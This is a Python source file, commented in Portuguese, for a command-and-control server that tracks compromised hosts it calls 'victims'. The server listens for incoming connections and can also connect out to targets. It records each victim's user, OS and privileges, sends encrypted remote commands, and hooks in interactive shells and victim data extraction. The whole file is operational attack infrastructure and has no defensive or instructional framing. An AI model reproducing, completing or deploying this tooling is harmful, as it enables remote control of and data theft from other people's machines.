import socket
import threading
import time
import select
import os
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt
from rich.progress import Progress
from rich.box import ROUNDED

from core.encryption import EncryptionHandler
from core.client_handler import ClientHandler
from utils.helpers import display_banner, display_mini_banner
from utils.logger import CommandLogger

class C2Server:
    def __init__(self, host="0.0.0.0", port=4444, encryption_key=None):
        self.host = host
        self.port = port
        self.clients = {}
        self.sessions = {}
        self.next_session_id = 1
        self.running = False
        self.server_socket = None
        self.encryption = EncryptionHandler(encryption_key)
        self.command_history = []
        self.max_history = 100
        self.mode = "server"
        self.console = Console()
        self.logger = CommandLogger()
        self.prompt_style = "bold red"
        self.client_prompt_style = "bold cyan"
        
    def display_banner(self):
        display_banner(self.console, self.host, self.port)
        
    def display_mini_banner(self):
        display_mini_banner(self.console)
        
    def clear_screen(self):
        """Limpa a tela de forma compatível com diferentes sistemas"""
        os.system('cls' if os.name == 'nt' else 'clear')
        self.display_mini_banner()
        
    def start_server(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            
            self.running = True
            self.console.print(f"[green]✓ Servidor C2 iniciado em {self.host}:{self.port}[/green]")
            
            if self.encryption.key:
                self.console.print("[green]✓ Criptografia ativada[/green]")
            
            # Thread para aceitar conexões
            accept_thread = threading.Thread(target=self.accept_connections)
            accept_thread.daemon = True
            accept_thread.start()
            
            # Thread para verificar conexões inativas
            cleanup_thread = threading.Thread(target=self.cleanup_inactive_clients)
            cleanup_thread.daemon = True
            cleanup_thread.start()
            
            return True
        except Exception as e:
            self.console.print(f"[red]✗ Erro ao iniciar servidor: {e}[/red]")
            return False

    def connect_to_victim(self, target_host, target_port):
        """Conecta a uma vítima como cliente"""
        try:
            self.mode = "client"
            self.console.print(f"[yellow]Tentando conectar a {target_host}:{target_port}...[/yellow]")
            
            victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            victim_socket.settimeout(10)
            victim_socket.connect((target_host, target_port))
            
            # Gerar ID de sessão
            session_id = self.next_session_id
            self.next_session_id += 1
            
            # Adicionar à lista de clientes
            self.clients[session_id] = {
                'socket': victim_socket,
                'address': (target_host, target_port),
                'connected_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'last_seen': datetime.now(),
                'last_active': datetime.now(),
                'info': 'Vítima conectada',
                'buffer': b'',
                'active': True,
                'os': 'Desconhecido',
                'username': 'Desconhecido',
                'is_victim': True,
                'privileges': 'Desconhecido'
            }
            
            self.sessions[session_id] = victim_socket
            
            self.console.print(f"[green]✓ Conectado a {target_host}:{target_port} (Sessão: {session_id})[/green]")
            
            # Thread para lidar com a vítima
            victim_thread = threading.Thread(
                target=self.handle_victim, 
                args=(victim_socket, (target_host, target_port), session_id)
            )
            victim_thread.daemon = True
            victim_thread.start()
            
            return session_id
            
        except Exception as e:
            self.console.print(f"[red]✗ Erro ao conectar à vítima: {e}[/red]")
            return None
    
    def handle_victim(self, victim_socket, victim_address, session_id):
        """Lida com a comunicação com uma vítima conectada"""
        handler = ClientHandler(self, victim_socket, victim_address, session_id)
        handler.handle_victim()
        
    def accept_connections(self):
        while self.running:
            try:
                client_socket, client_address = self.server_socket.accept()
                
                # Gerar ID de sessão
                session_id = self.next_session_id
                self.next_session_id += 1
                
                # Adicionar à lista de clientes
                self.clients[session_id] = {
                    'socket': client_socket,
                    'address': client_address,
                    'connected_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    'last_seen': datetime.now(),
                    'last_active': datetime.now(),
                    'info': 'Desconhecido',
                    'buffer': b'',
                    'active': True,
                    'os': 'Desconhecido',
                    'username': 'Desconhecido',
                    'is_victim': False,
                    'privileges': 'Desconhecido'
                }
                
                self.sessions[session_id] = client_socket
                
                self.console.print(f"[green]✓ Nova conexão de {client_address[0]}:{client_address[1]} (Sessão: {session_id})[/green]")
                
                # Thread para lidar com o cliente
                client_thread = threading.Thread(
                    target=self.handle_client, 
                    args=(client_socket, client_address, session_id)
                )
                client_thread.daemon = True
                client_thread.start()
                
            except Exception as e:
                if self.running:
                    self.console.print(f"[red]✗ Erro ao aceitar conexão: {e}[/red]")
    
    def cleanup_inactive_clients(self):
        """Remove clientes inativos após 5 minutos"""
        while self.running:
            time.sleep(30)
            now = datetime.now()
            to_remove = []
            
            for session_id, client in list(self.clients.items()):
                if (now - client['last_active']).total_seconds() > 300:
                    to_remove.append(session_id)
            
            for session_id in to_remove:
                self.console.print(f"[yellow]Removendo cliente inativo (Sessão: {session_id})[/yellow]")
                self.remove_client(session_id)
    
    def receive_data(self, sock, timeout=1):
        """Recebe dados do socket com timeout"""
        ready = select.select([sock], [], [], timeout)
        if ready[0]:
            try:
                data = sock.recv(65536)
                return data
            except:
                return None
        return None
    
    def handle_client(self, client_socket, client_address, session_id):
        handler = ClientHandler(self, client_socket, client_address, session_id)
        handler.handle_client()
    
    def send_data(self, session_id, data):
        """Envia dados para um cliente específico"""
        if session_id not in self.sessions:
            return False
            
        try:
            # Criptografar se necessário
            if self.encryption.key:
                data = self.encryption.encrypt(data)
            else:
                data = data.encode('utf-8')
                
            self.sessions[session_id].send(data)
            return True
        except Exception as e:
            self.console.print(f"[red]✗ Erro ao enviar dados: {e}[/red]")
            self.remove_client(session_id)
            return False
    
    def remove_client(self, session_id):
        if session_id in self.clients:
            client_info = self.clients[session_id]
            self.console.print(f"[yellow]✗ Conexão fechada: Sessão {session_id} ({client_info['address'][0]})[/yellow]")
            
            try:
                client_info['socket'].close()
            except:
                pass
            
            del self.clients[session_id]
            if session_id in self.sessions:
                del self.sessions[session_id]
    
    def send_command(self, session_id, command):
        if session_id not in self.sessions:
            self.console.print(f"[red]✗ Sessão {session_id} não encontrada[/red]")
            return False
            
        try:
            # Adicionar ao histórico
            self.logger.log_command(session_id, command)
                
            # Formatar comando para o cliente entender
            return self.send_data(session_id, f"CMD:{command}\n")
        except Exception as e:
            self.console.print(f"[red]✗ Erro ao enviar comando: {e}[/red]")
            self.remove_client(session_id)
            return False
    
    def list_clients(self, detailed=False):
        if not self.clients:
            self.console.print("[yellow]Nenhum cliente conectado[/yellow]")
            return
            
        table = Table(title="Clientes Conectados", show_header=True, header_style="bold magenta", box=ROUNDED)
        table.add_column("Sessão", style="cyan", no_wrap=True)
        table.add_column("Endereço", style="green")
        table.add_column("Usuário", style="yellow")
        table.add_column("Sistema")
        table.add_column("Privilégios")
        table.add_column("Conectado em", no_wrap=True)
        table.add_column("Última atividade", no_wrap=True)
        table.add_column("Tipo")
        
        if detailed:
            table.add_column("Info")
        
        for session_id, client in self.clients.items():
            last_active = (datetime.now() - client['last_active']).total_seconds()
            last_active_str = f"{int(last_active)}s" if last_active < 60 else f"{int(last_active/60)}min"
            
            client_type = "Vítima" if client.get('is_victim', False) else "Cliente"
            
            row_data = [
                str(session_id),
                f"{client['address'][0]}:{client['address'][1]}",
                client['username'],
                client['os'],
                client['privileges'],
                client['connected_at'],
                last_active_str,
                client_type
            ]
            
            if detailed:
                row_data.append(client['info'])
            
            table.add_row(*row_data)
            
        self.console.print(table)
    
    def show_command_history(self, limit=10):
        self.logger.show_history(limit, self.console)
    
    def interactive_shell(self, session_id):
        from commands.basic import interactive_shell
        interactive_shell(self, session_id)
    
    def extract_data(self, session_id, data_type):
        """Extrai dados específicos da vítima"""
        from commands.system import extract_data
        return extract_data(self, session_id, data_type)
    
    def show_help(self):
        from commands.basic import show_help
        show_help(self.console)
    
    def show_config(self):
        from commands.basic import show_config
        show_config(self)
    
    def exec_command(self, session_id, command):
        """Executa um comando único e mostra o resultado"""
        from commands.basic import exec_command
        return exec_command(self, session_id, command)
    
    def change_host(self, new_host):
        """Altera o host do servidor"""
        if self.running:
            self.console.print("[red]Pare o servidor primeiro com 'exit' antes de mudar o host[/red]")
            return False
        
        self.host = new_host
        self.console.print(f"[green]Host alterado para: {new_host}[/green]")
        return True
    
    def change_port(self, new_port):
        """Altera a porta do servidor"""
        if self.running:
            self.console.print("[red]Pare o servidor primeiro com 'exit' antes de mudar a porta[/red]")
            return False
        
        try:
            self.port = int(new_port)
            self.console.print(f"[green]Porta alterada para: {new_port}[/green]")
            return True
        except ValueError:
            self.console.print("[red]Porta deve ser um número inteiro[/red]")
            return False
    
    def set_encryption_key(self, key):
        """Define uma nova chave de criptografia"""
        if self.running:
            self.console.print("[red]Pare o servidor primeiro com 'exit' antes de mudar a chave[/red]")
            return False
        
        self.encryption = EncryptionHandler(key)
        self.console.print("[green]Chave de criptografia definida[/green]")
        return True
    
    def get_prompt(self):
        """Retorna o prompt personalizado baseado no modo"""
        if self.mode == "server":
            return f"[{self.prompt_style}]c2[/{self.prompt_style}] > "
        else:
            return f"[{self.client_prompt_style}]c2-client[/{self.client_prompt_style}] > "
    
    def run(self):
        if not self.running:
            if not self.start_server():
                return
        
        self.clear_screen()
        self.console.print("[green]Digite 'help' para ver os comandos disponíveis[/green]")
        
        # Loop principal de comando
        while True:
            try:
                # Prompt personalizado baseado no modo
                prompt_text = self.get_prompt()
                
                command_input = Prompt.ask(prompt_text).strip()
                
                if not command_input:
                    continue
                    
                # Processar comando
                from commands.basic import process_command
                should_exit = process_command(self, command_input)
                if should_exit:
                    break
                    
            except KeyboardInterrupt:
                self.console.print("\n[yellow]Use 'exit' para sair[/yellow]")
            except Exception as e:
                self.console.print(f"[red]Erro ao processar comando: {e}[/red]")
